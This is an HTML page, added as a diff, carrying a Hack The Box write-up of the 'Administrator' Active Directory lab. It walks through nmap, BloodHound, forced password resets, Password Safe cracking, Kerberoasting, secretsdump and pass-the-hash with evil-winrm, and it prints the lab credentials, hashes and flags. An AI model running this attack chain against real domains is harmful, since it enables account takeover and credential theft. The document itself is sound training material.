@@ -1,0 +1,400 @@
+<!DOCTYPE html>
+<html lang="en">
+    <head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script>
+        <meta charset="UTF-8">
+<meta http-equiv="X-UA-Compatible" content="ie=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+<meta name="author" content="">
+<meta name="description" content="Intianal Enumeration Full port scan
+As always I start off with a port scan. first a full port scan followed by a detailed targetted port scan.
+nmap 10.129.59.66 Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-01-20 13:10 CST
+Nmap scan report for 10.129.59.66
+Host is up (0.010s latency).
+Not shown: 988 closed tcp ports (reset)
+PORT STATE SERVICE
+21/tcp open ftp
+53/tcp open domain
+88/tcp open kerberos-sec
+135/tcp open msrpc
+139/tcp open netbios-ssn
+389/tcp open ldap
+445/tcp open microsoft-ds
+464/tcp open kpasswd5
+593/tcp open http-rpc-epmap
+636/tcp open ldapssl
+3268/tcp open globalcatLDAP
+3269/tcp open globalcatLDAPssl
+" />
+<meta name="keywords" content="" />
+<meta name="robots" content="noodp" />
+<meta name="theme-color" content="" />
+<link rel="canonical" href="http://localhost:1313/writeups/hackthebox-documentations/writeup-administrator/" />
+
+
+    <title>
+        
+             :: Hackthekat home 
+        
+    </title>
+
+
+
+<link href="https://cdnjs.cloudflare.com/ajax/libs/flag-icon-css/3.5.0/css/flag-icon.min.css" rel="stylesheet"
+    type="text/css">
+
+
+
+<link rel="stylesheet" href="/main.d7ff2d2210fd0ab14f417c6d91d2931b4ecffab189943b30890ff820a24a57c9.css">
+
+
+
+
+
+    <link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png">
+    <link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png">
+    <link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png">
+    <link rel="manifest" href="/site.webmanifest">
+    <link rel="mask-icon" href="/safari-pinned-tab.svg" color="">
+    <link rel="shortcut icon" href="/favicon.ico">
+    <meta name="msapplication-TileColor" content="">
+
+
+
+  <meta itemprop="name" content="Hackthekat home">
+  <meta itemprop="description" content="Intianal Enumeration Full port scan
+As always I start off with a port scan. first a full port scan followed by a detailed targetted port scan.
+nmap 10.129.59.66 Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-01-20 13:10 CST
+Nmap scan report for 10.129.59.66
+Host is up (0.010s latency).
+Not shown: 988 closed tcp ports (reset)
+PORT STATE SERVICE
+21/tcp open ftp
+53/tcp open domain
+88/tcp open kerberos-sec
+135/tcp open msrpc
+139/tcp open netbios-ssn
+389/tcp open ldap
+445/tcp open microsoft-ds
+464/tcp open kpasswd5
+593/tcp open http-rpc-epmap
+636/tcp open ldapssl
+3268/tcp open globalcatLDAP
+3269/tcp open globalcatLDAPssl">
+  <meta itemprop="wordCount" content="1194">
+
+  <meta name="twitter:card" content="summary">
+  <meta name="twitter:title" content="Hackthekat home">
+  <meta name="twitter:description" content="Intianal Enumeration Full port scan
+As always I start off with a port scan. first a full port scan followed by a detailed targetted port scan.
+nmap 10.129.59.66 Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-01-20 13:10 CST
+Nmap scan report for 10.129.59.66
+Host is up (0.010s latency).
+Not shown: 988 closed tcp ports (reset)
+PORT STATE SERVICE
+21/tcp open ftp
+53/tcp open domain
+88/tcp open kerberos-sec
+135/tcp open msrpc
+139/tcp open netbios-ssn
+389/tcp open ldap
+445/tcp open microsoft-ds
+464/tcp open kpasswd5
+593/tcp open http-rpc-epmap
+636/tcp open ldapssl
+3268/tcp open globalcatLDAP
+3269/tcp open globalcatLDAPssl">
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+    </head>
+
+    
+        <body>
+    
+    
+        <div class="container">
+            <header class="header">
+    <span class="header__inner">
+        <a href="/" style="text-decoration: none;">
+    <div class="logo">
+        
+            <span class="logo__mark">></span>
+            <span class="logo__text">hello</span>
+            <span class="logo__cursor" style=
+                  "
+                   
+                   ">
+            </span>
+        
+    </div>
+</a>
+
+
+        <span class="header__right">
+            
+                <nav class="menu">
+    <ul class="menu__inner">
+            
+            <div class="submenu">
+                <li class="dropdown">
+                    <a href="/posts/">
+                        Blog
+                    </a>
+                </li>
+            </div>
+            
+        
+            
+                <div class="submenu">
+                    <li class="dropdown">
+                        <a href="/hackthebox/">
+                            Hack The Box
+                        </a>
+                        <div class="dropdown-content">
+                            
+                               <a title="Machines" href="/tags/machines/">
+                                   Machines
+                                </a>
+                            
+                        </div>
+                    </li>
+                </div>
+            
+        
+
+    
+    </ul>
+</nav>
+
+                <span class="menu-trigger">
+                    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24">
+                        <path d="M0 0h24v24H0z" fill="none"/>
+                        <path d="M3 18h18v-2H3v2zm0-5h18v-2H3v2zm0-7v2h18V6H3z"/>
+                    </svg>
+                </span>
+            
+        </span>
+    </span>
+</header>
+
+
+            <div class="content">
+                
+    <main class="post">
+
+        <div class="post-info">
+            
+            </p>
+        </div>
+
+        <article>
+            
+                <h2 class="post-title"><a href="http://localhost:1313/writeups/hackthebox-documentations/writeup-administrator/"></a></h2>
+            
+
+
+            
+            
+            
+
+            <div class="post-content">
+                <h1 id="intianal-enumeration">Intianal Enumeration</h1>
+<p><strong>Full port scan</strong></p>
+<p>As always I start off with a port scan. first a full port scan followed by a detailed targetted port scan.</p>
+<pre tabindex="0"><code>nmap 10.129.59.66
+</code></pre><p>Starting Nmap 7.94SVN ( <a href="https://nmap.org">https://nmap.org</a> ) at 2025-01-20 13:10 CST<br>
+Nmap scan report for 10.129.59.66<br>
+Host is up (0.010s latency).<br>
+Not shown: 988 closed tcp ports (reset)<br>
+PORT STATE SERVICE<br>
+21/tcp open ftp<br>
+53/tcp open domain<br>
+88/tcp open kerberos-sec<br>
+135/tcp open msrpc<br>
+139/tcp open netbios-ssn<br>
+389/tcp open ldap<br>
+445/tcp open microsoft-ds<br>
+464/tcp open kpasswd5<br>
+593/tcp open http-rpc-epmap<br>
+636/tcp open ldapssl<br>
+3268/tcp open globalcatLDAP<br>
+3269/tcp open globalcatLDAPssl</p>
+<p><strong>Detailed port scan</strong></p>
+<pre tabindex="0"><code>nmap -p21,53,88,135,139,389,445,464,593,636,3268,3269 -sCV 10.129.59.66
+</code></pre><p>PORT STATE SERVICE VERSION<br>
+21/tcp open ftp Microsoft ftpd<br>
+| ftp-syst:<br>
+|_ SYST: Windows_NT<br>
+53/tcp open domain Simple DNS Plus<br>
+88/tcp open kerberos-sec Microsoft Windows Kerberos (server time: 2025-01-21 02:11:19Z)<br>
+135/tcp open msrpc Microsoft Windows RPC<br>
+139/tcp open netbios-ssn Microsoft Windows netbios-ssn<br>
+389/tcp open ldap Microsoft Windows Active Directory LDAP (Domain: administrator.htb0., Site: Default-First-Site-Name)<br>
+445/tcp open microsoft-ds?<br>
+464/tcp open kpasswd5?<br>
+593/tcp open ncacn_http Microsoft Windows RPC over HTTP 1.0<br>
+636/tcp open tcpwrapped<br>
+3268/tcp open ldap Microsoft Windows Active Directory LDAP (Domain: administrator.htb0., Site: Default-First-Site-Name)<br>
+3269/tcp open tcpwrapped<br>
+Service Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows</p>
+<p>Host script results:<br>
+| smb2-security-mode:<br>
+| 3:1:1:<br>
+|_ Message signing enabled and required<br>
+|<em>clock-skew: 7h00m00s</em><br>
+<em>| smb2-time:</em><br>
+<em>| date: 2025-01-21T02:11:21</em><br>
+<em>|</em> start_date: N/A</p>
+<p>From the scan we can see that it is an AD machine</p>
+<p>I made a connection to the windows machine with the user we already got in the beginning: username “olivia” &amp; password “ichliebedich”</p>
+<p><img src="85590054.png" alt="image-20250120-212919.png"></p>
+<p>because I have now seen that I could log in with this user on the windows machine, I can go get all the data from the domain controllers. This by doing the following command:</p>
+<pre tabindex="0"><code>nxc ldap 10.129.59.66 -u olivia -p ichliebedich --bloodhound --collection All --dns-server 10.129.59.66
+</code></pre><p><img src="85491754.png" alt="image-20250120-213136.png"></p>
+<p>Now if we set up bloodhound and start uploading the data there we can start seeing which path we can start abusing for user Michael to become.</p>
+<p><img src="85557279.png" alt="image-20250120-213413.png"></p>
+<p>We see that we have genericall rights on michael and so we can change the password of the user.</p>
+<p>So I went into the connection with the windows machine to change the user michael&rsquo;s password. this by executing the following command.</p>
+<pre tabindex="0"><code>net user michael Testing123
+</code></pre><p><img src="85491762.png" alt="image-20250120-213653.png"></p>
+<p>We can see above that we were able to change the password properly.</p>
+<p>If we go back to look at bloodhound we can see the following:</p>
+<p><img src="85557287.png" alt="image-20250120-213909.png"></p>
+<p>We see that the user michael can go and change benjamin&rsquo;s password. So for this I will go log in to the windows connection with michael&rsquo;s user credentials.</p>
+<pre tabindex="0"><code>evil-winrm -u &#39;michael&#39; -p &#39;Testing123&#39; -i 10.129.59.66
+</code></pre><p><img src="85590067.png" alt="image-20250120-214117.png"></p>
+<p>I went to change the password of the user benjamin by executing the following commands.</p>
+<p>We will first upload the module powerview.ps1 on the machine by executing the following command.</p>
+<pre tabindex="0"><code>upload ./PowerView.ps1
+</code></pre><p><img src="85557301.png" alt="image-20250120-214503.png"></p>
+<p>We will start importing the module by executing the following code.</p>
+<pre tabindex="0"><code>Import-Module ./PowerView.ps1
+</code></pre><p>![[Pasted image 20250122142310.png]]</p>
+<p>We will put the password we want to use for changing the benjamin into a variable. This is done by executing the following command.</p>
+<pre tabindex="0"><code>$cred = ConvertTo-SecureString &#34;Password123!&#34; -AsPlainText -force
+</code></pre><p>![[Pasted image 20250122142247.png]]</p>
+<p>With the “Set-DomainUserPassword” command we will be able to start changing the user&rsquo;s password.</p>
+<pre tabindex="0"><code>Set-DomainUserPassword -identity benjamin -accountpassword $cred
+</code></pre><p>![[Pasted image 20250122142227.png]]</p>
+<p>Now that the we have benjamin&rsquo;s password we can go log in to the ftp server.</p>
+<p><img src="85590092.png" alt="image-20250120-215237.png"></p>
+<p>There we can see that there is a Backup.psafe3 file. We will start downloading it using the following command:</p>
+<pre tabindex="0"><code>get Backup.psafe3
+</code></pre><p><img src="85590099.png" alt="image-20250120-215412.png"></p>
+<p>I am going to make a hash of this file first so that I can start using the password that is on this file to log in so that I can see what is in the file. I am going to do this using the following command:</p>
+<pre tabindex="0"><code>pwsafe2john Backup.psafe3
+</code></pre><p><img src="85491739.png" alt="image-20250120-211729.png"></p>
+<p>This outcome then put to a file so this is then easier to pre-crack with john.</p>
+<pre tabindex="0"><code>pwsafe2john Backup.psafe3 &gt; hash
+</code></pre><p><img src="85590027.png" alt="image-20250120-211822.png"></p>
+<p>Going to crack password with john using the following command:</p>
+<pre tabindex="0"><code>john hash --wordlist=/usr/share/wordlists/rockyou.txt 
+</code></pre><p><img src="85557263.png" alt="image-20250120-211905.png"></p>
+<h3 id="passwordsafe">PasswordSafe</h3>
+<p>pwsafe is a tool for securely managing and storing passwords and other sensitive information, so we will have to download passwordsafe and open the Backup.psafe3 file. We can do this by executing the following command:</p>
+<p>pwsafe Backup.psafe3</p>
+<p><img src="85491732.png" alt="image-20250120-211538.png"></p>
+<p>So with the password we cracked above, we can now start logging into the password safe.</p>
+<p><img src="85590034.png" alt="image-20250120-211959.png"></p>
+<p>As you can see below I have put all the passwords and all the usernames that could be found in the password safe in a separate notepad file. I will now try logging in to the windows machine using the evil-winrm command:</p>
+<pre tabindex="0"><code>evil-winrm -u &#39;emily&#39; -p &#39;UXLCI5iETUsIBoFVTj8yQFKoHjXmb&#39; -i 10.129.59.66
+</code></pre><p><img src="85590043.png" alt="image-20250120-212257.png"></p>
+<p>as you are going to be able to see below I have now been able to obtain a shell with the windows machine.</p>
+<p>So now we have found the user flag.</p>
+<p>user flag: 4ecdfc859c886951ec7fdb9d2d695fff</p>
+<p><img src="85557270.png" alt="image-20250120-212521.png"></p>
+<h2 id="kerberoasting-attack">Kerberoasting-attack</h2>
+<p>I will perform a targeted Kerberoasting attack against a domain controller in the domain Administrator.htb. It uses the specified user account emily and her password UXLCI5iETUsIBoFVTj8yQFKoHjXmb to access the domain controller at IP address 10.129.59.66.</p>
+<p><strong>What exactly is it going to do?</strong></p>
+<ul>
+<li>Authentication:</li>
+</ul>
+<p>-u “emily” and -p “UXLCI5iETUsIBoFVTj8yQFKoHjXmb” provide the user emily&rsquo;s login credentials. The tool uses these to log in to the Administrator.htb domain.</p>
+<ul>
+<li>Target:</li>
+</ul>
+<p>-d “Administrator.htb” specifies the Active Directory domain on which the attack is carried out.</p>
+<p>&ndash;dc-ip 10.129.59.66 specifies the IP address of the target domain controller (Domain Controller, DC).</p>
+<ul>
+<li>Kerberoasting attack:</li>
+</ul>
+<p>The tool performs a Kerberoast attack, targeting service accounts in Active Directory that have a Service Principal Name (SPN). These are accounts often associated with services such as SQL, IIS or custom applications. The attack works as follows:</p>
+<p>The tool requests a Kerberos service ticket (TGS) for a specific service using the specified account.</p>
+<p>The obtained ticket is stored as it is cryptographically encrypted with the NTLM hash of the service account.</p>
+<p>The attacker can crack this ticket offline to retrieve the NTLM hash of the service account.</p>
+<pre tabindex="0"><code>python targetedKerberoast.py -u &#34;emily&#34; -p &#34;UXLCI5iETUsIBoFVTj8yQFKoHjXmb&#34; -d &#34;Administrator.htb&#34; --dc-ip 10.129.59.66
+</code></pre><p>![[Pasted image 20250122142138.png]]</p>
+<p>We will now get the following error</p>
+<p>[!] Kerberos SessionError: KRB_AP_ERR_SKEW(Clock skew too great)</p>
+<p>we will be able to avoid this problem with the following command:</p>
+<pre tabindex="0"><code>sudo ntpdate administrator.htb
+</code></pre><p>and now if we will run the command then we will start to get the hash for the user ethan.</p>
+<p><img src="85786632.png" alt="image-20250120-230353.png"></p>
+<p>I went to put these in a separate file and started trying to crack it with john. this by running the following command.</p>
+<pre tabindex="0"><code>john hash --wordlist=/usr/share/wordlists/rockyou.txt 
+</code></pre><h2 id="active-directory-credential-dumping">Active Directory Credential Dumping</h2>
+<p>This command is to use the Impacket tool secretsdump.py to extract sensitive data (such as password hashes, user credentials and other authentication information) from a Windows system, specifically a domain controller, so that I can then start abusing this hash for logging in as the administrator.</p>
+<pre tabindex="0"><code>impacket-secretsdump &#34;Administrator.htb/ethan:limpbizkit&#34;@&#34;dc.Administrator.htb&#34;
+</code></pre><p><img src="85786651.png" alt="image-20250121-084843.png"></p>
+<p>As you can see in the picture above, I put a red frame there. Inside this frame is the hash that we will use to log in as administrator.</p>
+<p>ROOT</p>
+<p>so now we are going to start logging into the admin account by the hash we just obtained.</p>
+<pre tabindex="0"><code>evil-winrm -i administrator.htb -u administrator -H &#34;3dc553ce4b9fd20bd016e098d2d2fd2e&#34;
+</code></pre><p><img src="85819402.png" alt="image-20250120-230959.png"></p>
+<p>As we navigate now to the desktop folder within the root user will we see there te root flag.</p>
+<p>root flag: dee8add3e7f9ef3e9e0e7f9439eb6836</p>
+<p><img src="85786641.png" alt="image-20250120-231053.png"></p>
+<p>ROOTED</p>
+<p><img src="85819408.png" alt="image-20250120-231112.png"></p>
+
+            </div>
+        </article>
+
+        <hr />
+
+        <div class="post-info">
+            
+            
+  		</div>
+    </main>
+
+            </div>
+
+            
+                <footer class="footer">
+    
+    
+    
+        <div class="footer__inner">
+            <div class="footer__content">
+            
+            
+        </div>
+</footer>
+
+            
+        </div>
+
+        
+
+
+
+<script type="text/javascript" src="/bundle.min.efa6b6352b1e4d712533d2fbd29f0c899eb1474e0f181433c934e6c6fdd3678ff834c116423c957d7a6ff6763e9c0d599a82208cdeae81c4a483e37853c46360.js" integrity="sha512-76a2NSseTXElM9L70p8MiZ6xR04PGBQzyTTmxv3TZ4/4NMEWQjyVfXpv9nY&#43;nA1ZmoIgjN6ugcSkg&#43;N4U8RjYA=="></script>
+
+
+
+    </body>
+</html>
